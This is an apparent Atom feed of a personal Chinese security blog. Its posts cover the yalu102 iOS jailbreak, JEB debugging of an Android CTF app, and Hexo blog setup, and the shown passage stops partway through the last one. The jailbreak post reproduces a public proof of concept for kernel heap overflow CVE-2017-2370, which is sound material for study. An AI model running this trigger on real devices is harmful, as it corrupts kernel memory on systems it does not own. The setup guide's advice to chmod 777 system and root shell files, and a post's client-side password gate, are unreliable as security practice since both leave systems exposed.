@@ -1,0 +1,333 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>FloatingGuy&#39;s Blog</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2017-02-07T11:30:18.000Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>FloatingGuy</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>yalu102 越狱</title>
+    <link href="http://yoursite.com/2017/02/07/yalu102-%E8%B6%8A%E7%8B%B1/"/>
+    <id>http://yoursite.com/2017/02/07/yalu102-越狱/</id>
+    <published>2017-02-07T07:56:37.000Z</published>
+    <updated>2017-02-07T11:30:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="基本信息："><a href="#基本信息：" class="headerlink" title="基本信息："></a>基本信息：</h3><p>luca 发布了ios 10.2 版本的开源越狱工具。<br>yalu 102 repo: <a href="https://github.com/kpwn/yalu102" target="_blank" rel="external">https://github.com/kpwn/yalu102</a><br>zhengmin repo:<a href="https://github.com/zhengmin1989/yalu102.git" target="_blank" rel="external">https://github.com/zhengmin1989/yalu102.git</a><br>CVE: CVE-2017-2370</p>
+<a id="more"></a>
+<h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>漏洞在mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)函数中, 因为错误的将用户态指针(args-&gt;recipe_size)当成了长度值， 导致内核堆溢出漏洞。<br>因为拷贝的数据源和拷贝的长度都是用户可控的所以利用比较容易。</p>
+<h3 id="简易POC"><a href="#简易POC" class="headerlink" title="简易POC:"></a>简易POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div></pre></td><td class="code"><pre><div class="line">// ianbeer</div><div class="line">#if 0</div><div class="line">iOS/MacOS kernel memory corruption due to userspace pointer being used as a length</div><div class="line"></div><div class="line">mach_voucher_extract_attr_recipe_trap is a mach trap which can be called from any context</div><div class="line"></div><div class="line">Here&apos;s the code:</div><div class="line"></div><div class="line">    kern_return_t</div><div class="line">    mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)</div><div class="line">    &#123;</div><div class="line">        ipc_voucher_t voucher = IV_NULL;</div><div class="line">        kern_return_t kr = KERN_SUCCESS;</div><div class="line">        mach_msg_type_number_t sz = 0;</div><div class="line"></div><div class="line">        if (copyin(args-&gt;recipe_size, (void *)&amp;sz, sizeof(sz)))     &lt;---------- (a)</div><div class="line">            return KERN_MEMORY_ERROR;</div><div class="line"></div><div class="line">        if (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</div><div class="line">            return MIG_ARRAY_TOO_LARGE;</div><div class="line"></div><div class="line">        voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</div><div class="line">        if (voucher == IV_NULL)</div><div class="line">            return MACH_SEND_INVALID_DEST;</div><div class="line"></div><div class="line">        mach_msg_type_number_t __assert_only max_sz = sz;</div><div class="line"></div><div class="line">        if (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</div><div class="line">            /* keep small recipes on the stack for speed */</div><div class="line">            uint8_t krecipe[sz];</div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, sz)) &#123;</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">        &#125; else &#123;</div><div class="line">            uint8_t *krecipe = kalloc((vm_size_t)sz);                 &lt;---------- (b)</div><div class="line">            if (!krecipe) &#123;</div><div class="line">                kr = KERN_RESOURCE_SHORTAGE;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, args-&gt;recipe_size)) &#123;         &lt;----------- (c)</div><div class="line">                kfree(krecipe, (vm_size_t)sz);</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">            kfree(krecipe, (vm_size_t)sz);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        kr = copyout(&amp;sz, args-&gt;recipe_size, sizeof(sz));</div><div class="line"></div><div class="line">    done:</div><div class="line">        ipc_voucher_release(voucher);</div><div class="line">        return kr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">Here&apos;s the argument structure (controlled from userspace)</div><div class="line"></div><div class="line">    struct mach_voucher_extract_attr_recipe_args &#123;</div><div class="line">        PAD_ARG_(mach_port_name_t, voucher_name);</div><div class="line">        PAD_ARG_(mach_voucher_attr_key_t, key);</div><div class="line">        PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);</div><div class="line">        PAD_ARG_(user_addr_t, recipe_size);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">recipe and recipe_size are userspace pointers.</div><div class="line"></div><div class="line">At point (a) four bytes are read from the userspace pointer recipe_size into sz.</div><div class="line"></div><div class="line">At point (b) if sz was less than MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120) and greater than MACH_VOUCHER_TRAP_STACK_LIMIT (256)</div><div class="line">sz is used to allocate a kernel heap buffer.</div><div class="line"></div><div class="line">At point (c) copyin is called again to copy userspace memory into that buffer which was just allocated, but rather than passing sz (the</div><div class="line">validate size which was allocated) args-&gt;recipe_size is passed as the size. This is the userspace pointer *to* the size, not the size!</div><div class="line"></div><div class="line">This leads to a completely controlled kernel heap overflow.</div><div class="line"></div><div class="line">Tested on MacOS Sierra 10.12.1 (16B2555)</div><div class="line">#endif</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;mach/mach.h&gt;</div><div class="line">#include &lt;mach/mach_vm.h&gt;</div><div class="line">#include &lt;mach/mach_error.h&gt;</div><div class="line">#include &lt;mach/mach_traps.h&gt;</div><div class="line">#include &lt;mach/mach_voucher_types.h&gt;</div><div class="line"></div><div class="line">#include &lt;atm/atm_types.h&gt;</div><div class="line"></div><div class="line">mach_port_t get_voucher() &#123;</div><div class="line">  mach_voucher_attr_recipe_data_t r = &#123;</div><div class="line">    .key = MACH_VOUCHER_ATTR_KEY_ATM,</div><div class="line">    .command = MACH_VOUCHER_ATTR_ATM_CREATE</div><div class="line">  &#125;;</div><div class="line">  mach_port_t p = MACH_PORT_NULL;</div><div class="line">  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&amp;r, sizeof(r), &amp;p);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;failed to create voucher (%s)\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">   printf(&quot;got voucher: %x\n&quot;, p);</div><div class="line"></div><div class="line">  return p;</div><div class="line">&#125;</div><div class="line"></div><div class="line">uint64_t map(uint64_t addr, uint64_t size) &#123;</div><div class="line">  uint64_t _addr = addr;</div><div class="line">  kern_return_t err = mach_vm_allocate(mach_task_self(), &amp;_addr, size, 0);</div><div class="line">  if (err != KERN_SUCCESS || _addr != addr) &#123;</div><div class="line">    printf(&quot;failed to allocate fixed mapping: %s\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">  return addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  void* recipe_size = (void*)map(0x123450000, 0x1000);</div><div class="line">  *(uint64_t*)recipe_size = 0x1000;</div><div class="line"></div><div class="line">  uint64_t size = 0x1000000;</div><div class="line">  void* recipe = malloc(size);</div><div class="line">  memset(recipe, 0x41, size);</div><div class="line"></div><div class="line">  mach_port_t port = get_voucher();</div><div class="line">  kern_return_t err = mach_voucher_extract_attr_recipe_trap(</div><div class="line">      port,</div><div class="line">      1,</div><div class="line">      recipe,</div><div class="line">      recipe_size);</div><div class="line"></div><div class="line">  printf(&quot;%s\n&quot;, mach_error_string(err));</div><div class="line"></div><div class="line">  return 41;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>目前此漏洞已经在 macOS 10.12.3 和 iOS 10.2.1 上被修复。</p>
+<h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>在iphone6 10.2版本的手机上使用 zhengmin 编译的ipa 可以越狱但是不稳定，重启以后cydia 闪退。</p>
+<p>Supported Devices and iOS versions</p>
+<table>
+<thead>
+<tr>
+<th>Device</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>iPad Pro</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPhone 6S</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPhone SE</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPhone 5S</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPad Air</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPad Mini 2</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPhone 6</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPad Mini 3</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPad Air 2</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPad Mini 4</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+<tr>
+<td>iPod touch (6G)</td>
+<td>iOS 10.0.0 -&gt; iOS 10.2</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;基本信息：&quot;&gt;&lt;a href=&quot;#基本信息：&quot; class=&quot;headerlink&quot; title=&quot;基本信息：&quot;&gt;&lt;/a&gt;基本信息：&lt;/h3&gt;&lt;p&gt;luca 发布了ios 10.2 版本的开源越狱工具。&lt;br&gt;yalu 102 repo: &lt;a href=&quot;https://github.com/kpwn/yalu102&quot;&gt;https://github.com/kpwn/yalu102&lt;/a&gt;&lt;br&gt;zhengmin repo:&lt;a href=&quot;https://github.com/zhengmin1989/yalu102.git&quot;&gt;https://github.com/zhengmin1989/yalu102.git&lt;/a&gt;&lt;br&gt;CVE: CVE-2017-2370&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
+    
+    
+      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>happy new year</title>
+    <link href="http://yoursite.com/2017/02/04/happy-new-year/"/>
+    <id>http://yoursite.com/2017/02/04/happy-new-year/</id>
+    <published>2017-02-03T17:32:43.000Z</published>
+    <updated>2017-02-03T17:33:07.000Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>jeb-v2.2.7真机调试 APK(nodebug)</title>
+    <link href="http://yoursite.com/2017/01/24/jeb-v2-2-7%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95-APK-nodebug/"/>
+    <id>http://yoursite.com/2017/01/24/jeb-v2-2-7真机调试-APK-nodebug/</id>
+    <published>2017-01-23T16:31:49.000Z</published>
+    <updated>2017-02-03T19:05:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="JEB2-2-7-调试阿里2016移动安全-第三题-app部分"><a href="#JEB2-2-7-调试阿里2016移动安全-第三题-app部分" class="headerlink" title="JEB2.2.7 调试阿里2016移动安全 第三题-app部分"></a>JEB2.2.7 调试阿里2016移动安全 第三题-app部分</h2><hr>
+<p>本文主要是用来记录在 动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。</p>
+<a id="more"></a>
+<blockquote>
+<p>说明：</p>
+<pre><code>1. app debugable 开关关闭。我采用刷ROM(userdebug 版本)的方式绕过。
+2. 测试手机: Nexus 5x
+3. Android 版本: 6.0.1
+</code></pre></blockquote>
+<script>
+    if( prompt("Please input password") !== String(111) )
+    {
+        alert('密码错误！');
+        self.location='http://localhost:4000/about/';
+        // history.back();
+    } else {
+        alert("密码正确");
+    }
+</script>
+
+<hr>
+<p>工具：jeb-v2.2.7<br>需要配置的环境变量：JEB_HOME 和 ANDROID_SDK。</p>
+<h3 id="bug-统计"><a href="#bug-统计" class="headerlink" title="bug 统计"></a>bug 统计</h3><ol>
+<li>jeb动态调试BUG:<br> ANDROID_SDK配置完全正确，但是每次 debug 时都显示<code>找不到 ADB</code>。</li>
+</ol>
+<p>原因：我是通过Alfred 通过开启的 jeb.app， 这种方式访问不到环境变量所以找不到 ADB。<br>解决：</p>
+<pre><code>1. 可以通过写脚本，每次在终端执行  （完成 jeb_debug...sh）
+2. 到 jeb目录下执行 jeb_mac.sh
+</code></pre><h3 id="jeb注意事项："><a href="#jeb注意事项：" class="headerlink" title="jeb注意事项："></a>jeb注意事项：</h3><pre><code>1. 只有在 bytecode view时才可以 debug
+2. 视频中可以从 art 指令直接跳转到 so汇编中执行，但是我本次测试时不行。。。
+3. localval 窗口显示的只有 数字没有字符不知道怎么对应。
+</code></pre><h3 id="jeb-快捷键："><a href="#jeb-快捷键：" class="headerlink" title="jeb 快捷键："></a>jeb 快捷键：</h3><pre><code>* 下断点：cmd+B
+* 反编译：q
+* 后退/前进： alt+ ←/→
+</code></pre><h2 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h2><p>在上传 gif 解析时，app中将 URL 强制从<code>URLConnection</code>转换成了 <code>HTTPURLConnection</code>类型，所以我们json文件中的<code>address</code>值必须包含<code>http://</code>否则会抛出<code>MalformedURLException</code>异常</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.pnfsoftware.com/blog/jeb-android-debuggers/" target="_blank" rel="external">AN INTRODUCTION TO JEB ANDROID DEBUGGERS</a><br><a href="https://www.pnfsoftware.com/blog/category/jeb2/" target="_blank" rel="external">ADVANCED DEBUGGER USAGE VIA THE INTERPRETER</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;JEB2-2-7-调试阿里2016移动安全-第三题-app部分&quot;&gt;&lt;a href=&quot;#JEB2-2-7-调试阿里2016移动安全-第三题-app部分&quot; class=&quot;headerlink&quot; title=&quot;JEB2.2.7 调试阿里2016移动安全 第三题-app部分&quot;&gt;&lt;/a&gt;JEB2.2.7 调试阿里2016移动安全 第三题-app部分&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;本文主要是用来记录在 动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="research" scheme="http://yoursite.com/categories/research/"/>
+    
+    
+      <category term="jeb" scheme="http://yoursite.com/tags/jeb/"/>
+    
+      <category term="动态调试" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
+    
+      <category term="Armv8-64" scheme="http://yoursite.com/tags/Armv8-64/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>配置hexo + github page 个人Blog</title>
+    <link href="http://yoursite.com/2017/01/22/%E9%85%8D%E7%BD%AEhexo-github-page-%E4%B8%AA%E4%BA%BABlog/"/>
+    <id>http://yoursite.com/2017/01/22/配置hexo-github-page-个人Blog/</id>
+    <published>2017-01-22T04:52:26.000Z</published>
+    <updated>2017-02-07T08:19:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基础配置（一）"><a href="#基础配置（一）" class="headerlink" title="基础配置（一）"></a>基础配置（一）</h2><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><a id="more"></a>
+<p>1.install nodejs-v6.9.4</p>
+<pre><code>下载zip package
+</code></pre><ol>
+<li>安装Nodejs<br> ubuntu: <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nodejs</div><div class="line"><span class="comment">#检查版本</span></div><div class="line">node -v</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>如果nodejs 版本不是 <strong>v6.9.4</strong>,那么需要去官网下载按照包：</p>
+<p>安装release版 (Nodejs)[<a href="http://www.ctolib.com/topics-106467.html" target="_blank" rel="external">http://www.ctolib.com/topics-106467.html</a>]</p>
+<blockquote>
+<p>如果命令行下载不了 nodejs:<br>安装过程 官网下载好，解压。终端 mv node-v6.9.4-linux-x64 /opt/ 输入命令：sudo chmod 777 /etc/profile，进入目录下，备份一下，这里我是用 sublime text 打<br>开的，在末尾添加以下三行：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> NODE_HOME=/opt/node-v6.9.4-linux-x64</div><div class="line"><span class="built_in">export</span> PATH=PATH:PATH:NODE_HOME/bin</div><div class="line"><span class="built_in">export</span> NODE_PATH=<span class="variable">$NODE_HOME</span>/lib/node_modules</div></pre></td></tr></table></figure>
+<blockquote>
+<p>之后按保存退出 在命令行输入：source /etc/profile，然后在命令行输入：node -v，返回版本信息v6.9.4，说明环境变量配置就生效了；但，你会发现进入root账户，改配置并没有生效 在命令行输入：sudo chmod 777 /root/.bashrc,进入所在目录，备份好文件，并在文件末尾加入一行source /etc/profile命令，保存。这样就大功告成了。 操作完后记得将权限改回去。</p>
+</blockquote>
+<p>3.install nodejs-legacy</p>
+<pre><code>sudo apt-get install nodejs-legacy
+</code></pre><p>4.install hexo</p>
+<pre><code>sudo npm install -g hexo-cli --registry=https://registry.npm.taobao.org
+</code></pre><h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir <span class="variable">$Blog</span>-name &amp;&amp; <span class="built_in">cd</span> <span class="variable">$Blog</span>-name</div><div class="line">hexo init <span class="variable">$blog</span></div><div class="line"><span class="built_in">cd</span> <span class="variable">$blog</span></div></pre></td></tr></table></figure>
+<h3 id="Hexo-用法"><a href="#Hexo-用法" class="headerlink" title="Hexo 用法"></a>Hexo 用法</h3><ol>
+<li><p>常用命令列表：</p>
+<ol>
+<li><strong>~ generate <g>        #生成静态文件</g></strong></li>
+<li><strong>~ server <s>          #本地预览环境</s></strong></li>
+<li><strong>~ new “paper name”    #创建博文</strong></li>
+<li><strong>~ deploy <d>          #部署</d></strong></li>
+<li>~ new page “page name”  #创建页面<br>本地测试在浏览器中打开 localhost:4000</li>
+</ol>
+</li>
+<li><p>Hexo根目录结构</p>
+</li>
+</ol>
+<ul>
+<li><p>需要上传到 source repo 的文件</p>
+<p>  #全局配置文件，站点基本信息(title/subtitle/author/..), 主题 …<br>  -rw-rw-r–  1 floatg floatg 1.5K  1月 21 16:51 _config.yml</p>
+<p>  #所有博文都在source/目录下<br>  drwxrwxr-x  3 floatg floatg 4.0K  1月 21 16:51 source<br>  drwxrwxr-x  2 floatg floatg 4.0K  1月 21 16:51 scaffolds<br>  -rw-rw-r–  1 floatg floatg  448  1月 21 17:07 package.json</p>
+<p>  #所有可以使用的主题都在这个目录下，每个主题对应一个文件夹<br>  drwxrwxr-x  4 floatg floatg 4.0K  1月 21 17:17 themes<br>  -rw-r–r–  1 floatg floatg  77B  1 23 15:39 .gitignore</p>
+</li>
+<li><p>.gitignore 过滤的文件</p>
+<p>  -rw-rw-r–  1 floatg floatg  24K  1月 21 17:07 db.json<br>  drwxrwxr-x 12 floatg floatg 4.0K  1月 21 16:53 node_modules<br>  drwxrwxr-x  7 floatg floatg 4.0K  1月 21 17:07 public<br>  drwxr-xr-x   17 floatg  floatg   578B  1 23 15:16 .deploy_git</p>
+</li>
+</ul>
+<p>#本地测试脚本<br>    -rwxr-xr-x    1 floatg  floatg    91B  1 23 14:38 rtest.sh<br>    -rw-r–r–@   1 floatg  floatg   6.0K  1 23 14:55 .DS_Store</p>
+<h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>目前 我找到的主题比较少，只有默认的landscape 和huno，较喜欢huno。</p>
+<ol>
+<li><p>下载主题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> themes</div><div class="line">git <span class="built_in">clone</span> git@github.com:someus/huno.git</div></pre></td></tr></table></figure>
+</li>
+<li><p>分析主题</p>
+<ol>
+<li>cyanstyle 可以设置背景图片,并且page主体是一个半透明的theme, 建议背景图片搞一个深色的图</li>
+<li>huno  左右布局，极简风格，category,目录等基本功能齐全</li>
+<li>landscape 上下布局</li>
+<li>icarus  感觉是设计，艺术风，推荐给@Alian。 这个主体还有一些<a href="https://github.com/ppoffice/hexo-theme-icarus/issues" target="_blank" rel="external">bug</a>,测试的时候存在显示<a href="https://github.com/ppoffice/hexo-theme-icarus/wiki" target="_blank" rel="external">问题</a></li>
+<li>aero-dual  上下布局，喜欢配色</li>
+<li>yelee    很喜欢， 冬天显示列表+目录</li>
+<li>xnew      目录+归档–按日期排列</li>
+<li>GhoSadillaX  使用中</li>
+</ol>
+</li>
+</ol>
+<h2 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h2><p>(更多内容)[<a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a>]<br>(统计)[<a href="http://busuanzi.ibruce.info/" target="_blank" rel="external">http://busuanzi.ibruce.info/</a>]</p>
+<p>hexo config review<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">hexo: 3.2.2</div><div class="line">hexo-cli: 1.0.2</div><div class="line">os: Linux 4.x.x-xx-generic linux xxx</div><div class="line">http_parser: 1.0</div><div class="line">node: 0.10.25</div><div class="line">v8: 3.xx.5.9</div><div class="line">ares: 1.10.0</div><div class="line">uv: 0.10.23</div><div class="line">zlib: 1.2.8</div><div class="line">modules: 11</div><div class="line">openssl: x.x.xf</div></pre></td></tr></table></figure></p>
+<h2 id="夸主机同步-Blog"><a href="#夸主机同步-Blog" class="headerlink" title="夸主机同步 Blog"></a>夸主机同步 Blog</h2><h3 id="CI辅助自动部署"><a href="#CI辅助自动部署" class="headerlink" title="CI辅助自动部署"></a>CI辅助自动部署</h3><p>参考文章:<br><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/" target="_blank" rel="external">http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/</a><br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/" target="_blank" rel="external">https://formulahendry.github.io/2016/12/04/hexo-ci/</a></p>
+<p>我首先尝试了使用appveyor 做CI的办法，效果不尽如人意。主要的问题在：</p>
+<pre><code>1. nodejs, hexo的版本和我本地不同，导致命令 解析都不一样。解决办法：可以在yml中下载制定版本
+2. 使用作者的yml, 直接把我content repo下的内容删除了连site都打不开了。
+3. 执行速度很慢，push完成以后貌似要到[appveyor管理页面](https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io)去点击 **new build** 才能执行下去。
+</code></pre><p>虽然有一些bug，不过还是蛮有趣的产品。先说下原理，再说下大概的步骤：</p>
+<ol>
+<li><p>原理：CI工具(这里是appveyor)会监控代码管理(github)中指定repo的commit记录, 发现有新的commit 就会将代码拉取到CI主机上，然后去执行repo根目录下的appveyor.yml中的命令。</p>
+</li>
+<li><p>步骤:</p>
+<ol>
+<li>open appveyor <a href="https://ci.appveyor.com/projects" target="_blank" rel="external">projects page</a></li>
+<li>create new projects, choose Github, source-code repo (支持的所有代码管理工具)</li>
+<li>add appveyor.yml to source-code repo root directory</li>
+<li>get Token from <a href="https://help.github.com/articles/creating-an-access-token-for-command-line-use/" target="_blank" rel="external">Github</a></li>
+<li>CI platform to <a href="https://ci.appveyor.com/tools/encrypt" target="_blank" rel="external">encrypt Token page</a></li>
+<li>set CI environment<ul>
+<li>STATIC_SITE_REPO    – github content repo</li>
+<li>TARGET_BRANCH       – content repo branch</li>
+<li>GIT_USER_EMAIL      – github account</li>
+<li>GIT_USER_NAME       – github username</li>
+</ul>
+</li>
+<li>oK,  you can using your blog， finally push source repo</li>
+<li><strong>Debug</strong> project page can monitor appveyor.yml file <a href="https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io" target="_blank" rel="external">console</a></li>
+</ol>
+</li>
+</ol>
+<p><del>最终没有找到好的解决办法,目前就先这样啦,等找到办法了再来更新</del></p>
+<h3 id="github-托管-source"><a href="#github-托管-source" class="headerlink" title="github 托管 source"></a>github 托管 source</h3><p>原理就是将常用电脑上的 blog根目录下建立 git仓库(source repo)，然后注意哪些文件要上传，哪些不能上传。以后可以在任意一台电脑上将 source repo clone 到本地，然后按照下面的步骤来配置。<br>步骤：</p>
+<ol>
+<li>安装 node-v6.9.4</li>
+<li>clone 到本地以后，进入 repo目录然后安装工具&amp;模块。</li>
+<li><p>执行下面的命令就可以配置好 hexo</p>
